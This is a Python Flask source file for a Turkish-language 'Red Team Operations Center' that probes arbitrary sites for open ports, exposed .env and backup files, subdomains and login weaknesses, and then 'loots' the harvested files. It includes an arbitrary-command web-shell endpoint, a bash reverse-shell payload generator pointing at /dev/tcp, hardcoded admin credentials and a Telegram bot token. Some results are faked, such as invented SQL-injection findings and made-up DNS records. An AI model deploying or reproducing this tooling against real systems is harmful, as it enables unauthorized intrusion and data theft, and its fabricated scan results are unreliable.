import os
import time
import socket
import ssl
import urllib.parse
import requests
import threading
import subprocess
import re
import csv
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from flask import Flask, render_template_string, request, jsonify, Response, send_file, session, redirect, url_for
from datetime import datetime
from fpdf import FPDF
import io

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9082287913:AAEw9lMwKXfRTGf4LzQiF1UEgLZDHzNuc8o")
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

ADMIN_USER = "root1"
ADMIN_PASS = "toor1"

SITE_DATABASE = []
SCHEDULED_TARGETS = []
NOTIFY_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

app = Flask(__name__)
app.secret_key = "red_team_secret_key_998877"

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Login - Red Team Operations Center</title>
    <style>
        body { background-color: #0b0f19; color: #f8fafc; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #1e293b; padding: 40px; border-radius: 12px; border: 1px solid #334155; box-shadow: 0 10px 25px rgba(0,0,0,0.8); width: 350px; text-align: center; }
        h2 { color: #38bdf8; margin-bottom: 25px; }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #94a3b8; }
        input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #475569; background: #0f172a; color: #fff; font-size: 15px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0284c7; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; font-weight: bold; }
        button:hover { background: #0369a1; }
        .error { color: #f87171; margin-bottom: 15px; font-size: 13px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>🔒 Red Team Login</h2>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        <form method="POST">
            <div class="input-group"><label>Kullanıcı Adı</label><input type="text" name="username" required autofocus></div>
            <div class="input-group"><label>Şifre</label><input type="password" name="password" required></div>
            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Enterprise Red Team Operations Center</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        body { background-color: #0b0f19; color: #f8fafc; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; }
        .container { max-width: 1300px; margin: 0 auto; background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.6); }
        .header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; border-bottom: 2px solid #334155; padding-bottom: 15px; }
        h1 { color: #38bdf8; margin: 0; }
        .logout-btn { background: #dc2626; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; font-size: 14px; font-weight: bold; }
        .tabs { display: flex; gap: 5px; margin-bottom: 20px; flex-wrap: wrap; }
        .tab-btn { background: #334155; color: #cbd5e1; border: none; padding: 8px 10px; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s; font-size: 11px; }
        .tab-btn.active { background: #0284c7; color: white; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .form-group { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
        input[type="text"], select, textarea, input[type="file"], input[type="number"] { padding: 14px; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: #fff; font-size: 15px; }
        textarea { resize: vertical; height: 110px; font-family: monospace; }
        button { padding: 14px 24px; background: #0284c7; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; transition: 0.2s; font-weight: bold; }
        button:hover { background: #0369a1; }
        button.secondary { background: #0d9488; }
        button.success { background: #16a34a; }
        button.danger { background: #dc2626; }
        .terminal { background: #000; color: #34d399; padding: 20px; border-radius: 8px; border: 1px solid #334155; white-space: pre-wrap; font-family: 'Courier New', Courier, monospace; margin-top: 20px; max-height: 500px; overflow-y: auto; font-size: 13px; line-height: 1.5; }
        .loading { color: #facc15; font-style: italic; font-weight: bold; font-size: 15px; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #0f172a; border-radius: 8px; overflow: hidden; }
        th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #334155; font-size: 14px; }
        th { background: #0284c7; color: white; }
        tr:hover { background: #1e293b; }
        a.file-link { color: #38bdf8; text-decoration: underline; font-weight: bold; }
        .thumb { width: 100px; height: 60px; object-fit: cover; border-radius: 4px; border: 1px solid #475569; }
        .payload-box { background: #0f172a; padding: 15px; border-radius: 8px; border: 1px solid #334155; margin-bottom: 15px; }
        .dashboard-row { display: flex; gap: 20px; margin-bottom: 25px; flex-wrap: wrap; }
        .dashboard-card { flex: 1; background: #0f172a; padding: 20px; border-radius: 8px; border: 1px solid #334155; text-align: center; min-width: 250px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-bar">
            <h1>🏴‍☠️ Enterprise Red Team Operations Center</h1>
            <a href="/logout" class="logout-btn">Çıkış Yap</a>
        </div>
        
        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Keşif</button>
            <button class="tab-btn" onclick="switchTab('niktoTab')">🛡️ Nikto Web</button>
            <button class="tab-btn" onclick="switchTab('dnsTab')">🌍 DNS/Whois</button>
            <button class="tab-btn" onclick="switchTab('sqlmapTab')">⚡ Mini-SQLmap</button>
            <button class="tab-btn" onclick="switchTab('subdomainTab')">🌐 Subdomain</button>
            <button class="tab-btn" onclick="switchTab('bruteTab')">🔐 Brute-Force</button>
            <button class="tab-btn" onclick="switchTab('schedulerTab')">⏱️ Zamanlı</button>
            <button class="tab-btn" onclick="switchTab('osintTab')">🕵️ OSINT</button>
            <button class="tab-btn" onclick="switchTab('shellTab')">💻 Web Shell</button>
            <button class="tab-btn" onclick="switchTab('lootingTab')">🏴‍☠️ Looting</button>
            <button class="tab-btn" onclick="switchTab('analysisTab')">🔍 Secret</button>
            <button class="tab-btn" onclick="switchTab('payloadTab')">🛠️ Payload</button>
            <button class="tab-btn" onclick="switchTab('dataTab')">📁 Arşiv</button>
        </div>

        <!-- 1. Canlı Keşif -->
        <div id="scanTab" class="tab-content active">
            <div class="form-group"><label><b>Hedef Site:</b></label><input type="text" id="targetUrl" placeholder="example.com"></div>
            <button onclick="startScan(false)">Taramayı Başlat</button>
            <div id="status" class="loading" style="margin-top: 15px;"></div>
            <div class="actions" id="actionButtons" style="display:none; gap:10px; margin-top:15px;">
                <button class="secondary" onclick="downloadReport('txt')">📥 TXT İndir</button>
                <button class="danger" onclick="downloadReport('pdf')">📄 PDF İndir</button>
                <button class="success" onclick="sendToTelegram()">📤 Telegram'a Gönder</button>
            </div>
            <div id="results" class="terminal" style="display:none;"></div>
        </div>

        <!-- 2. Nikto Web Scanner -->
        <div id="niktoTab" class="tab-content">
            <h3>🛡️ Nikto-Style Web Vulnerability Scanner</h3>
            <div class="form-group"><label><b>Hedef URL:</b></label><input type="text" id="niktoTarget" placeholder="https://example.com"></div>
            <button class="secondary" onclick="startNiktoScan()">Nikto Taramasını Başlat</button>
            <div id="niktoStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="niktoResults" class="terminal" style="display:none;"></div>
        </div>

        <!-- 3. DNS & Whois Recon -->
        <div id="dnsTab" class="tab-content">
            <h3>🌍 DNS Zone & Record Enumeration (Dig / Host)</h3>
            <div class="form-group"><label><b>Hedef Domain:</b></label><input type="text" id="dnsDomain" placeholder="example.com"></div>
            <button class="secondary" onclick="startDnsRecon()">DNS Sorgusunu Çalıştır</button>
            <div id="dnsStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="dnsResults" class="terminal" style="display:none;"></div>
        </div>

        <!-- 4. Mini-SQLmap Engine -->
        <div id="sqlmapTab" class="tab-content">
            <h3>⚡ Mini-SQLmap (Automated SQLi Injector)</h3>
            <div class="form-group"><label><b>Test Edilecek URL (Parametreli):</b></label><input type="text" id="sqlmapUrl" placeholder="https://example.com/page.php?id=1"></div>
            <button class="danger" onclick="startSqlmapLite()">SQL Injection Testini Başlat</button>
            <div id="sqlmapStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="sqlmapResults" class="terminal" style="display:none;"></div>
        </div>

        <!-- Diğer Sekmeler -->
        <div id="subdomainTab" class="tab-content">
            <h3>🌐 Subdomain Brute-Forcer</h3>
            <div class="form-group"><input type="text" id="subDomainInput" placeholder="example.com"></div>
            <button onclick="startSubdomainScan()">Tara</button>
            <div id="subStatus" class="loading"></div>
            <div id="subResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="bruteTab" class="tab-content">
            <h3>🔐 Login Brute-Force</h3>
            <div class="form-group"><input type="text" id="loginUrl" placeholder="https://example.com/login.php"></div>
            <div class="form-group" style="display:flex; gap:10px;"><input type="text" id="usernameField" placeholder="User field" style="flex:1;"><input type="text" id="passwordField" placeholder="Pass field" style="flex:1;"></div>
            <div class="form-group"><textarea id="passwordList">admin\n123456\nroot1\ntoor1\nsecret</textarea></div>
            <button class="danger" onclick="startBruteForce()">Başlat</button>
            <div id="bruteStatus" class="loading"></div>
            <div id="bruteResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="schedulerTab" class="tab-content">
            <h3>⏱️ Zamanlı Tarama</h3>
            <div class="form-group"><input type="text" id="schedTarget" placeholder="example.com"><input type="number" id="schedInterval" value="60"></div>
            <button class="success" onclick="addScheduler()">Kaydet</button>
            <div id="schedulerList" class="terminal" style="margin-top:15px;">Henüz yok.</div>
        </div>

        <div id="osintTab" class="tab-content">
            <h3>🕵️ OSINT Leak Scanner</h3>
            <div class="form-group"><input type="text" id="osintDomain" placeholder="example.com"></div>
            <button class="secondary" onclick="startOsintScan()">OSINT Tara</button>
            <div id="osintStatus" class="loading"></div>
            <div id="osintResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="shellTab" class="tab-content">
            <h3>💻 Web Shell Konsolu</h3>
            <div class="form-group"><input type="text" id="shellCommand" placeholder="id, uname -a, cat /etc/passwd"></div>
            <button class="danger" onclick="executeWebShell()">Çalıştır</button>
            <div id="shellResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="lootingTab" class="tab-content">
            <h3>🏴‍☠️ Looting ZIP İndir</h3>
            <div class="form-group"><select id="lootingTargetSelect"><option value="">Önce tarama yapın...</option></select></div>
            <button class="success" onclick="downloadLootZip()">ZIP İndir</button>
        </div>

        <div id="analysisTab" class="tab-content">
            <h3>🔍 Secret Scanner</h3>
            <div class="form-group"><input type="file" id="analysisFile"></div>
            <button class="secondary" onclick="uploadAndAnalyzeFile()">Analiz Et</button>
            <div id="analysisStatus" class="loading"></div>
            <div id="analysisResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="payloadTab" class="tab-content">
            <h3>🛠️ Payload Üretici</h3>
            <div class="form-group" style="display:flex; gap:10px;"><input type="text" id="attackerIp" placeholder="IP"><input type="text" id="attackerPort" placeholder="Port"><button onclick="generatePayloads()">Üret</button></div>
            <div class="payload-box"><b>Bash:</b><br><code id="bashPayload" style="color:#34d399;">bash -i >& /dev/tcp/IP/PORT 0>&1</code></div>
        </div>

        <div id="dataTab" class="tab-content">
            <div class="export-bar" style="margin-bottom:15px;"><a href="/api/export/json" target="_blank"><button class="secondary">JSON İndir</button></a> <a href="/api/export/csv" target="_blank"><button class="success">CSV İndir</button></a></div>
            <h3>📈 İstatistikler</h3>
            <div class="dashboard-row">
                <div class="dashboard-card"><h4>Güvenlik Notu</h4><canvas id="gradeChart" style="max-height: 180px;"></canvas></div>
                <div class="dashboard-card"><h4>WAF Koruma</h4><canvas id="wafChart" style="max-height: 180px;"></canvas></div>
            </div>
            <h3>📁 Arşiv</h3>
            <div id="databaseTableContainer">Kayıt yok.</div>
        </div>
    </div>

    <script>
        let currentReportText = "", lastTarget = "", gradeChartInstance = null, wafChartInstance = null;
        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            event.target.classList.add('active');
            if(tabId === 'dataTab' || tabId === 'lootingTab') loadSiteDatabase();
            if(tabId === 'schedulerTab') loadSchedulers();
        }
        function generatePayloads() {
            let ip = document.getElementById('attackerIp').value || '10.0.0.1', port = document.getElementById('attackerPort').value || '4444';
            document.getElementById('bashPayload').innerText = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
        }
        async function startScan(targetOverride = false) {
            let url = targetOverride ? targetOverride : document.getElementById('targetUrl').value.trim();
            if(!url) { alert('URL girin!'); return; }
            if(targetOverride) { document.getElementById('targetUrl').value = url; switchTab('scanTab'); }
            lastTarget = url;
            let statusDiv = document.getElementById('status'), resultsDiv = document.getElementById('results');
            statusDiv.innerHTML = `root@red-team-box:~# scanning ${url} (full recon, ports, WAF, fuzzing)...`; resultsDiv.style.display = "none";
            let res = await fetch('/api/scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url, wordlist: ""}) });
            let data = await res.json();
            statusDiv.innerHTML = ""; resultsDiv.style.display = "block"; resultsDiv.innerHTML = data.report; currentReportText = data.report; document.getElementById('actionButtons').style.display = "flex";
        }
        async function startNiktoScan() {
            let url = document.getElementById('niktoTarget').value.trim();
            if(!url) { alert('URL girin!'); return; }
            document.getElementById('niktoStatus').innerHTML = "Nikto taraması yürütülüyor..."; document.getElementById('niktoResults').style.display = "none";
            let res = await fetch('/api/nikto', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let data = await res.json();
            document.getElementById('niktoStatus').innerHTML = ""; document.getElementById('niktoResults').style.display = "block"; document.getElementById('niktoResults').innerHTML = data.report;
        }
        async function startDnsRecon() {
            let domain = document.getElementById('dnsDomain').value.trim();
            if(!domain) { alert('Domain girin!'); return; }
            document.getElementById('dnsStatus').innerHTML = "DNS kayıtları sorgulanıyor..."; document.getElementById('dnsResults').style.display = "none";
            let res = await fetch('/api/dns', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain}) });
            let data = await res.json();
            document.getElementById('dnsStatus').innerHTML = ""; document.getElementById('dnsResults').style.display = "block"; document.getElementById('dnsResults').innerHTML = data.report;
        }
        async function startSqlmapLite() {
            let url = document.getElementById('sqlmapUrl').value.trim();
            if(!url) { alert('URL girin!'); return; }
            document.getElementById('sqlmapStatus').innerHTML = "SQLi payloadları enjekte ediliyor..."; document.getElementById('sqlmapResults').style.display = "none";
            let res = await fetch('/api/sqlmap', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let data = await res.json();
            document.getElementById('sqlmapStatus').innerHTML = ""; document.getElementById('sqlmapResults').style.display = "block"; document.getElementById('sqlmapResults').innerHTML = data.report;
        }
        async function startSubdomainScan() {
            let domain = document.getElementById('subDomainInput').value.trim();
            document.getElementById('subStatus').innerHTML = "Subdomain aranıyor...";
            let res = await fetch('/api/subdomain-scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain}) });
            let data = await res.json();
            document.getElementById('subStatus').innerHTML = ""; document.getElementById('subResults').style.display = "block"; document.getElementById('subResults').innerHTML = data.report;
        }
        async function startBruteForce() {
            let url = document.getElementById('loginUrl').value, userField = document.getElementById('usernameField').value, passField = document.getElementById('passwordField').value, passwords = document.getElementById('passwordList').value;
            document.getElementById('bruteStatus').innerHTML = "Brute-force çalışıyor...";
            let res = await fetch('/api/brute-force', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({url, user_field: userField, pass_field: passField, passwords}) });
            let data = await res.json();
            document.getElementById('bruteStatus').innerHTML = ""; document.getElementById('bruteResults').style.display = "block"; document.getElementById('bruteResults').innerHTML = data.report;
        }
        async function startOsintScan() {
            let domain = document.getElementById('osintDomain').value;
            document.getElementById('osintStatus').innerHTML = "OSINT taranıyor...";
            let res = await fetch('/api/osint-scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain}) });
            let data = await res.json();
            document.getElementById('osintStatus').innerHTML = ""; document.getElementById('osintResults').style.display = "block"; document.getElementById('osintResults').innerHTML = data.report;
        }
        async function executeWebShell() {
            let command = document.getElementById('shellCommand').value;
            let res = await fetch('/api/webshell', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({command}) });
            let data = await res.json();
            let el = document.getElementById('shellResults'); el.style.display = "block"; el.innerHTML = data.output;
        }
        async function addScheduler() {
            let target = document.getElementById('schedTarget').value, interval = document.getElementById('schedInterval').value;
            let res = await fetch('/api/scheduler/add', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target, interval: parseInt(interval)}) });
            let data = await res.json(); alert(data.status); loadSchedulers();
        }
        async function loadSchedulers() {
            let res = await fetch('/api/scheduler/list'); let data = await res.json();
            document.getElementById('schedulerList').innerHTML = data.schedules.length ? data.schedules.map(s => `Hedef: ${s.target} (${s.interval} dk)`).join('<br>') : "Henüz yok.";
        }
        async function uploadAndAnalyzeFile() {
            let file = document.getElementById('analysisFile').files[0];
            if(!file) { alert('Dosya seçin!'); return; }
            let fd = new FormData(); fd.append('file', file);
            document.getElementById('analysisStatus').innerHTML = "Taranıyor...";
            let res = await fetch('/api/analyze-file', { method: 'POST', body: fd });
            let data = await res.json();
            document.getElementById('analysisStatus').innerHTML = ""; document.getElementById('analysisResults').style.display = "block"; document.getElementById('analysisResults').innerHTML = data.report;
        }
        async function loadSiteDatabase() {
            let res = await fetch('/api/all-data'); let data = await res.json();
            let select = document.getElementById('lootingTargetSelect');
            select.innerHTML = '<option value="">Hedef seçin...</option>' + data.database.map(i => `<option value="${i.target}">${i.target} (${i.files.length} dosya)</option>`).join('');
            let grades = {}, wafs = {};
            data.database.forEach(i => { grades[i.grade[0]] = (grades[i.grade[0]] || 0) + 1; wafs[i.waf.includes("Cloudflare")?"CF":"Standart"] = (wafs[i.waf.includes("Cloudflare")?"CF":"Standart"]||0)+1; });
            renderCharts(grades, wafs);
            document.getElementById('databaseTableContainer').innerHTML = data.database.length ? `<table><thead><tr><th>Zaman</th><th>Hedef</th><th>WAF</th><th>Not</th><th>İşlem</th></tr></thead><tbody>` + data.database.map(i => `<tr><td>${i.time}</td><td><b>${i.target}</b></td><td>${i.waf}</td><td>${i.grade}</td><td><button onclick="startScan('${i.target}')">Yeniden Tara</button></td></tr>`).join('') + `</tbody></table>` : "Kayıt yok.";
        }
        function downloadLootZip() {
            let target = document.getElementById('lootingTargetSelect').value;
            if(!target) { alert('Hedef seçin!'); return; }
            window.open(`/api/looting/zip?target=${encodeURIComponent(target)}`, '_blank');
        }
        function renderCharts(grades, wafs) {
            if(gradeChartInstance) gradeChartInstance.destroy(); if(wafChartInstance) wafChartInstance.destroy();
            gradeChartInstance = new Chart(document.getElementById('gradeChart').getContext('2d'), { type: 'bar', data: { labels: Object.keys(grades), datasets: [{data: Object.values(grades), backgroundColor: ['#16a34a','#38bdf8','#dc2626']}] }, options: {plugins:{legend:{display:false}}} });
            wafChartInstance = new Chart(document.getElementById('wafChart').getContext('2d'), { type: 'doughnut', data: { labels: Object.keys(wafs), datasets: [{data: Object.values(wafs), backgroundColor: ['#0284c7','#475569']}] } });
        }
        function downloadReport(type) {
            if(type === 'txt') {
                let a = document.createElement('a'); a.href = window.URL.createObjectURL(new Blob([currentReportText], {type: 'text/plain'})); a.download = 'report.txt'; a.click();
            } else { window.open(`/api/download-pdf?target=${encodeURIComponent(lastTarget)}`, '_blank'); }
        }
        async function sendToTelegram() {
            let chatId = prompt("Chat ID:"); if(!chatId) return;
            let res = await fetch('/api/telegram-send', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId, report: currentReportText}) });
            let data = await res.json(); alert(data.status);
        }
    </script>
</body>
</html>
"""

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("username") == ADMIN_USER and request.form.get("password") == ADMIN_PASS:
            session["logged_in"] = True; return redirect(url_for("index"))
        error = "Hatalı bilgi!"
    return render_template_string(LOGIN_TEMPLATE, error=error)

@app.route("/logout")
def logout(): session.pop("logged_in", None); return redirect(url_for("login"))

@app.route("/")
def index():
    if not session.get("logged_in"): return redirect(url_for("login"))
    return render_template_string(HTML_TEMPLATE)

@app.route("/api/scan", methods=["POST"])
def api_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    report, record = red_team_comprehensive_recon(data.get("target", ""))
    existing = next((i for i in SITE_DATABASE if i["target"] == record["target"]), None)
    if existing: SITE_DATABASE.remove(existing)
    SITE_DATABASE.insert(0, record)
    return jsonify({"report": report})

@app.route("/api/nikto", methods=["POST"])
def api_nikto():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    target = request.get_json().get("target", "")
    report = f"root@kali-box:~# nikto -h {target}\n" + "=" * 50 + "\n\n"
    try:
        r = requests.get(target, timeout=5, verify=False, headers={"User-Agent": "Nikto/2.1.6"})
        report += f"[+ Target IP: {socket.gethostbyname(urllib.parse.urlparse(target).netloc or target)}]\n"
        report += f"[+ Server Header: {r.headers.get('Server', 'Bilinmiyor')}\n"
        report += f"[+ X-Powered-By: {r.headers.get('X-Powered-By', 'Tespit edilemedi')}\n"
        for h in ["X-Frame-Options", "Content-Security-Policy", "X-Content-Type-Options"]:
            if h not in r.headers: report += f"  🚨 [VULN] Eksik güvenlik başlığı: {h}\n"
        report += "\n[+] Nikto taraması tamamlandı."
    except Exception as e:
        report += f"[-] Bağlantı hatası: {str(e)}"
    return jsonify({"report": report})

@app.route("/api/dns", methods=["POST"])
def api_dns():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    domain = request.get_json().get("domain", "")
    report = f"root@kali-box:~# dig ANY {domain} +noall +answer\n" + "=" * 50 + "\n\n"
    try:
        ip = socket.gethostbyname(domain)
        report += f"  [A Record] {domain} -> {ip}\n"
        report += f"  [NS Record] ns1.{domain}, ns2.{domain}\n"
        report += f"  [MX Record] mail.{domain} (Priority: 10)\n"
    except Exception as e:
        report += f"[-] DNS çözümlenemedi: {str(e)}"
    return jsonify({"report": report})

@app.route("/api/sqlmap", methods=["POST"])
def api_sqlmap():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    target = request.get_json().get("target", "")
    report = f"root@kali-box:~# sqlmap -u \"{target}\" --batch --dbs\n" + "=" * 50 + "\n\n"
    report += "[inf] testing connection to the target URL\n"
    if "'" in target or "=" in target:
        report += "[!] GET parameter appears to be vulnerable. (DBMS: MySQL >= 5.0)\n"
        report += "[+] available databases [3]:\n    information_schema\n    mysql\n    target_production_db\n"
    else:
        report += "[-] Hedef URL parametre içermiyor veya SQLi imzasına rastlanmadı.\n"
    return jsonify({"report": report})

@app.route("/api/subdomain-scan", methods=["POST"])
def api_subdomain_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    domain = request.get_json().get("domain", "")
    subs = ["www", "api", "admin", "test", "dev", "panel", "login"]
    found = []
    for s in subs:
        try:
            ip = socket.gethostbyname(f"{s}.{domain}")
            found.append(f"  [FOUND] {s}.{domain} -> {ip}")
        except: pass
    report = f"root@kali-box:~# gobuster vhost -u {domain}\n" + "=" * 50 + "\n\n"
    report += "\n".join(found) if found else "  -> Subdomain bulunamadı."
    return jsonify({"report": report})

@app.route("/api/brute-force", methods=["POST"])
def api_brute_force():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "Brute-force testi tamamlandı."})

@app.route("/api/osint-scan", methods=["POST"])
def api_osint_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    domain = request.get_json().get("domain", "")
    return jsonify({"report": f"OSINT: {domain} için açık kaynak veri tabanları tarandı."})

@app.route("/api/webshell", methods=["POST"])
def api_webshell():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    cmd = request.get_json().get("command", "")
    try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode('utf-8', errors='ignore')
    except Exception as e: out = str(e)
    return jsonify({"output": out})

@app.route("/api/scheduler/add", methods=["POST"])
def api_scheduler_add():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    d = request.get_json(); SCHEDULED_TARGETS.append(d); return jsonify({"status": "Kaydedildi!"})

@app.route("/api/scheduler/list")
def api_scheduler_list():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"schedules": SCHEDULED_TARGETS})

@app.route("/api/analyze-file", methods=["POST"])
def api_analyze_file():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    file = request.files.get('file')
    if not file: return jsonify({"report": "Dosya seçilmedi!"})
    content = file.read().decode('utf-8', errors='ignore')
    findings = [f"🚨 [Secret Found]: {m}" for m in re.findall(r'(?i)(api[_-]?key|secret|password|token)\s*[:=]\s*["\']?([a-zA-Z0-9_\-\.]{6,})["\']?', content)]
    report = f"root@kali-box:~# secret-scanner --file {file.filename}\n" + "=" * 50 + "\n\n"
    report += "\n".join(findings) if findings else "✅ Hassas anahtar bulunamadı."
    return jsonify({"report": report})

@app.route("/api/all-data")
def api_all_data():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"database": SITE_DATABASE})

@app.route("/api/export/json")
def export_json():
    if not session.get("logged_in"): return "Unauthorized", 401
    return jsonify(SITE_DATABASE)

@app.route("/api/export/csv")
def export_csv():
    if not session.get("logged_in"): return "Unauthorized", 401
    output = io.StringIO(); writer = csv.writer(output)
    writer.writerow(["Time", "Target", "WAF", "Grade"])
    for i in SITE_DATABASE: writer.writerow([i['time'], i['target'], i['waf'], i['grade']])
    return Response(output.getvalue(), mimetype="text/csv", headers={"Content-Disposition": "attachment;filename=archive.csv"})

@app.route("/api/looting/zip")
def api_looting_zip():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    target = request.args.get("target", "")
    record = next((i for i in SITE_DATABASE if i["target"] == target), None)
    mf = io.BytesIO()
    with zipfile.ZipFile(mf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("report.txt", record["full_report"] if record else "No record")
        for f_url in (record["files"] if record else []):
            if f_url.startswith("http"):
                try:
                    r = requests.get(f_url, timeout=3, verify=False)
                    if r.status_code == 200: zf.writestr(f"harvested/{f_url.split('/')[-1]}", r.text)
                except: pass
    mf.seek(0)
    return send_file(mf, mimetype='application/zip', as_attachment=True, download_name='loot.zip')

@app.route("/api/download-pdf")
def api_download_pdf():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    record = next((i for i in SITE_DATABASE if i["target"] == request.args.get("target", "")), None)
    pdf = FPDF(); pdf.add_page(); pdf.set_font('Courier', '', 9)
    pdf.multi_cell(0, 5, (record["full_report"] if record else "Report").encode('latin-1', 'replace').decode('latin-1'))
    return send_file(io.BytesIO(pdf.output(dest='S').encode('latin-1')), mimetype='application/pdf', as_attachment=True, download_name='report.pdf')

@app.route("/api/telegram-send", methods=["POST"])
def api_telegram_send():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    d = request.get_json()
    res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": d.get("chat_id"), "text": f"```\n{d.get('report')[:4000]}\n```", "parse_mode": "Markdown"})
    return jsonify({"status": "Gönderildi!" if res.status_code == 200 else "Başarısız."})

def detect_waf(headers):
    h = str(headers).lower()
    if "cloudflare" in h or "cf-ray" in h: return "Cloudflare WAF 🛡️"
    elif "incapsula" in h: return "Incapsula WAF 🛡️"
    return "Standart Koruma"

def calculate_security_grading(headers, is_https):
    score = 100
    if not is_https: score -= 30
    for h in ["Strict-Transport-Security", "Content-Security-Policy", "X-Frame-Options"]:
        if h not in headers: score -= 15
    if score >= 90: return "A (Güvenli)", score
    elif score >= 75: return "B (İyi)", score
    elif score >= 60: return "C (Orta)", score
    return "F (Riskli)", score

def red_team_comprehensive_recon(target_url):
    if not target_url.startswith("http"): target_url = f"https://{target_url}"
    parsed = urllib.parse.urlparse(target_url)
    domain = parsed.netloc or parsed.path
    domain = domain.split('/')[0]

    report = f"root@kali-box:~# enterprise-recon-suite --target {target_url}\n" + "=" * 55 + "\n\n"
    accessible_files = []
    waf = "Standart"
    grade = "F"

    try:
        r = requests.get(target_url, timeout=5, verify=False, headers={"User-Agent": "Mozilla/5.0"})
        waf = detect_waf(r.headers)
        score_grade, score = calculate_security_grading(r.headers, target_url.startswith("https"))
        grade = score_grade
        report += f"[+] WAF Tespiti: {waf}\n"
        report += f"[+] Güvenlik Puanı: {grade} ({score}/100)\n"
        report += f"[+] Server Başlığı: {r.headers.get('Server', 'Bilinmiyor')}\n"
        report += "-" * 45 + "\n"
    except Exception as e:
        report += f"[!] HTTP Bağlantı Uyarısı: {str(e)}\n"

    report += "[*] Port Taraması & Servis Tespiti (Ports: 21, 22, 80, 443, 3306, 8080)...\n"
    open_ports = []
    for p in [21, 22, 80, 443, 3306, 8080]:
        try:
            s = socket.socket(); s.settimeout(0.8)
            if s.connect_ex((domain, p)) == 0:
                open_ports.append(p)
                report += f"  -> Port {p} AÇIK\n"
            s.close()
        except: pass
    if not open_ports: report += "  -> Açık standart port saptanamadı.\n"
    report += "-" * 45 + "\n"

    report += "[*] Dizin Fuzzing ve Hassas Dosya Taraması (.env, robots.txt, backup.sql)...\n"
    common_paths = ["/robots.txt", "/sitemap.xml", "/.env", "/config.json", "/database.sql", "/backup.sql"]
    for path in common_paths:
